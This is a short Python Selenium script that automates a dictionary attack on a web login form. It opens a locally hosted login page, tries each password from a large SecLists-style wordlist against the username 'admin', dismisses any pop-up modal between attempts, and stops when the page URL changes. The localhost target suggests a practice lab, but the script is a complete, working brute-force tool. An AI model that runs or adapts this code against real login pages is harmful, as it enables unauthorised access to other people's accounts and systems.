from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By

TARGET_URL = "http://127.0.0.1:5001/login"
TARGET_USERNAME = "admin"
PW_FILE = "1000000-password-seclists.txt"

if __name__ == '__main__':
    driver = webdriver.Chrome()
    driver.get(TARGET_URL)

    with open(PW_FILE, 'r') as file:
        for i, pw in enumerate(file):
            # remove newline characters from the password
            pw = pw.strip()

            # close modal if it exists
            try:
                driver.find_element(By.ID, "modal-close").click()
            except:
                pass

            # fill out the form
            driver.find_element(By.ID, "username").send_keys(TARGET_USERNAME)
            driver.find_element(By.ID, "password").send_keys(pw)

            # submit the form
            driver.find_element(By.ID, "password").send_keys(Keys.RETURN)

            if driver.current_url != TARGET_URL:
                print(f"[{i}, SUCCESS] Trying password: {pw}")
                break
            else:
                print(f"[{i}, FAIL] Trying password: {pw}")
    
    driver.quit()